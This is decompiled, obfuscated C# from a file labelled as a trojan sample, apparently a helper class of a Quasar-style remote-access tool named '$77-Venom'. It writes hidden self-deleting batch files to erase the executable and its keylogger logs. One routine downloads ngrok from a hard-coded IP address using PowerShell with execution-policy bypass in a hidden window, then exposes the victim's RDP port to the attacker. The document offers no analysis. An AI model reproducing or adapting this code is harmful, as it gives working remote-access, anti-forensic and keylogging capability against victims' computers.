// Decompiled with JetBrains decompiler
// Type: 曭弻騯�ᑱ遲젆徏둂省퀓싗᝟觳崀錱Ἂፋ
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using xClient.Core.Utilities;

public static class \uEB4A曭弻騯\uFFFDᑱ遲젆徏둂省퀓싗\u175F觳崀\uEEE1錱Ἂፋ
{
  private const string Ềꀘ홈ᅩ嘮첩緇\uF86E\uF0F0\u2AB3\uE027瓬ꬣﰑ\uE6D9쐜\uF4EF鼪ᷛᦳ = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  private static readonly Random 慐ꋽ핞侽壋顊䛢洈쒵ઞ쑻巚䆋뙪\u0879ᵝ\u9FEF\uF50C㶆ﯺ = new Random(Environment.TickCount);

  public static string 僸\uE271퇚\uEF7E\u2E61캎\uE643ㅮ췃㟣䉴㛾웊\uFFFD뇫괎舊\uF62A\uE3FA齃(
    int length,
    string extension = "")
  {
    StringBuilder stringBuilder = new StringBuilder(length);
    for (int index = 0; index < length; ++index)
      stringBuilder.Append("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[\uEB4A曭弻騯\uFFFDᑱ遲젆徏둂省퀓싗\u175F觳崀\uEEE1錱Ἂፋ.慐ꋽ핞侽壋顊䛢洈쒵ઞ쑻巚䆋뙪\u0879ᵝ\u9FEF\uF50C㶆ﯺ.Next("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".Length)]);
    return stringBuilder.ToString() + extension;
  }

  public static string \uFFFD\u33F3웍֓蹚\uF347댷랣\uE02A輶卯ί\u323F煭촥뫢\uE32F\uFFFD왜㳺(string extension)
  {
    string path;
    do
    {
      path = Path.Combine(Path.GetTempPath(), \uEB4A曭弻騯\uFFFDᑱ遲젆徏둂省퀓싗\u175F觳崀\uEEE1錱Ἂፋ.僸\uE271퇚\uEF7E\u2E61캎\uE643ㅮ췃㟣䉴㛾웊\uFFFD뇫괎舊\uF62A\uE3FA齃(12, extension));
    }
    while (File.Exists(path));
    return path;
  }

  public static bool 碤퉠㝌颺갔\uE687\u0B4E럻娜㰰\uF102ㅪ읶\uF731暦鼂缈ﰔ㾼\u2BEF(byte[] block)
  {
    if (block.Length < 2)
      return false;
    if (block[0] == (byte) 77 && block[1] == (byte) 90)
      return true;
    return block[0] == (byte) 90 && block[1] == (byte) 77;
  }

  public static bool 劉\uECE2쥓蠔웇ô۪\uEB4Eᇸ\u1AED褬馤곍꾔勔鬦ཚ\u086B\u218B巉(string filePath) => 洈如ӏĢ묰\uE91B뎼腾\u066Cᓾ欐뽏粑ﮛ廻魪\u2974龬㰺㯦.䙁ڑ엶錄啳뒂겻蔺筃䡍וּ\uF35Eꑺ隁续\uFFFD춨埿䍳⃜(filePath + ":Zone.Identifier");

  public static string ꝕݻꦰ\uE3B9띕樵㦇讀챉靽器\uFFFDᄎꑮ梩俙橎\u2420\u2F66냭(bool isFileHidden)
  {
    try
    {
      string path = \uEB4A曭弻騯\uFFFDᑱ遲젆徏둂省퀓싗\u175F觳崀\uEEE1錱Ἂፋ.\uFFFD\u33F3웍֓蹚\uF347댷랣\uE02A輶卯ί\u323F煭촥뫢\uE32F\uFFFD왜㳺(".bat");
      string contents = "@echo off\r\nchcp 65001\r\necho DONT CLOSE THIS WINDOW!\r\nping -n 10 localhost > nul\r\ndel /a /q /f \"" + 보㕟袓\u226B脆ݔ㿀槡鉦ꤼ\u2ED4遪ഐ猱\uF6C6고ະ敯\uEC6Eǈ.CurrentPath + "\"\r\nrmdir /q /s \"" + Keylogger.LogDirectory + "\"\r\ndel /a /q /f \"" + path + "\"";
      File.WriteAllText(path, contents, (Encoding) new UTF8Encoding(false));
      return path;
    }
    catch (Exception ex)
    {
      return string.Empty;
    }
  }

  public static string \u0DD5싕\u289F櫬뮂泑ྰ\uFFFD柯혅嫠祅ⷼ\uF696勍ᆽ壋톾뵟Ǐ(string token)
  {
    try
    {
      string path = Path.Combine(Path.GetTempPath(), "ngrok.bat");
      string contents = "set downloadURL=http://91.134.207.16/ngrok.exe\r\nset logFile=%TEMP%\\proclog.txt\r\nset exeFile=%TEMP%\\ngrok.exe\r\nset logFile=%TEMP%\\proclog.txt\r\npowershell (new-object System.Net.WebClient).DownloadFile('http://91.134.207.16/ngrok.exe','%exeFile%');\r\n%exeFile% authtoken " + token + " \r\n%exeFile%  tcp  3389 > %logFile% \"" + path + "\"";
      File.WriteAllText(path, contents, (Encoding) new UTF8Encoding(false));
      Process.Start(new ProcessStartInfo()
      {
        FileName = "cmd",
        Arguments = "/k start /b powershell -noexit -executionpolicy bypass -File " + path + " ",
        CreateNoWindow = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        UseShellExecute = true,
        ErrorDialog = false
      });
      return path;
    }
    catch (Exception ex)
    {
      return string.Empty;
    }
  }

  public static string 칞퓗ᇲ楳禼鞾갞곥腂쿁䍈֞\u0CD8\uFFFD瘾郫폣揾そ缠(string newFilePath, bool isFileHidden)
  {
    try
    {
      string path = \uEB4A曭弻騯\uFFFDᑱ遲젆徏둂省퀓싗\u175F觳崀\uEEE1錱Ἂፋ.\uFFFD\u33F3웍֓蹚\uF347댷랣\uE02A輶卯ί\u323F煭촥뫢\uE32F\uFFFD왜㳺(".bat");
      string contents = "@echo off\r\nchcp 65001\r\necho DONT CLOSE THIS WINDOW!\r\nping -n 10 localhost > nul\r\ndel /a /q /f \"" + 보㕟袓\u226B脆ݔ㿀槡鉦ꤼ\u2ED4遪ഐ猱\uF6C6고ະ敯\uEC6Eǈ.CurrentPath + "\"\r\nmove /y \"" + newFilePath + "\" \"" + 보㕟袓\u226B脆ݔ㿀槡鉦ꤼ\u2ED4遪ഐ猱\uF6C6고ະ敯\uEC6Eǈ.CurrentPath + "\"\r\nstart \"\" \"" + 보㕟袓\u226B脆ݔ㿀槡鉦ꤼ\u2ED4遪ഐ猱\uF6C6고ະ敯\uEC6Eǈ.CurrentPath + "\"\r\ndel /a /q /f \"" + path + "\"";
      File.WriteAllText(path, contents, (Encoding) new UTF8Encoding(false));
      return path;
    }
    catch (Exception ex)
    {
      return string.Empty;
    }
  }

  public static string 馃ᢷ\uF2C6\uE646绾殻۴Ͽဠ硖鵞ቶꌓ膂㘵백꽱\u27E9䜷鲴()
  {
    try
    {
      string path = \uEB4A曭弻騯\uFFFDᑱ遲젆徏둂省퀓싗\u175F觳崀\uEEE1錱Ἂፋ.\uFFFD\u33F3웍֓蹚\uF347댷랣\uE02A輶卯ί\u323F煭촥뫢\uE32F\uFFFD왜㳺(".bat");
      string contents = "@echo off\r\nchcp 65001\r\necho DONT CLOSE THIS WINDOW!\r\nping -n 10 localhost > nul\r\nstart \"\" \"" + 보㕟袓\u226B脆ݔ㿀槡鉦ꤼ\u2ED4遪ഐ猱\uF6C6고ະ敯\uEC6Eǈ.CurrentPath + "\"\r\ndel /a /q /f \"" + path + "\"";
      File.WriteAllText(path, contents, (Encoding) new UTF8Encoding(false));
      return path;
    }
    catch (Exception ex)
    {
      return string.Empty;
    }
  }

  public static void 쏸瓽䂃\uEE16뎛\uFFFD喀\uE56B垯祘\u2221\u236C\uFBCC\uE52B킘\u2FD8흉ⴚ暛簮(
    string filename,
    string appendText)
  {
    appendText = \uEB4A曭弻騯\uFFFDᑱ遲젆徏둂省퀓싗\u175F觳崀\uEEE1錱Ἂፋ.䡖ᓅ\u193F顅鮯땦䊰쟗Ꞅ\u2996貿檀粸ة\u1CCBᖡ펷Ƭ\u3376ᰁ(filename) + appendText;
    using (FileStream fileStream = File.Open(filename, FileMode.Create, FileAccess.Write))
    {
      byte[] buffer = ᥣ뺟覈놗뺿\uF27B셖杇喰\uFFFD䳮\u2565蒵ﷰᬛ斧㞮\u0F3C軟韗.周薞\uD7A7饮渡㭪졲麹殪\uE8C7毾鐭䘑菊ꬼ쁪\uE043จꬅ\uFB08(Encoding.UTF8.GetBytes(appendText));
      fileStream.Seek(0L, SeekOrigin.Begin);
      fileStream.Write(buffer, 0, buffer.Length);
    }
  }

  public static string 䡖ᓅ\u193F顅鮯땦䊰쟗Ꞅ\u2996貿檀粸ة\u1CCBᖡ펷Ƭ\u3376ᰁ(string filename) => !File.Exists(filename) ? string.Empty : Encoding.UTF8.GetString(ᥣ뺟覈놗뺿\uF27B셖杇喰\uFFFD䳮\u2565蒵ﷰᬛ斧㞮\u0F3C軟韗.乔쩆쏂ᆙ濣ⶈ\uE1B0老\uF053ঢ়㔱韰䈵ۜ老閯왼Ũ\uF532軟(File.ReadAllBytes(filename)));
}
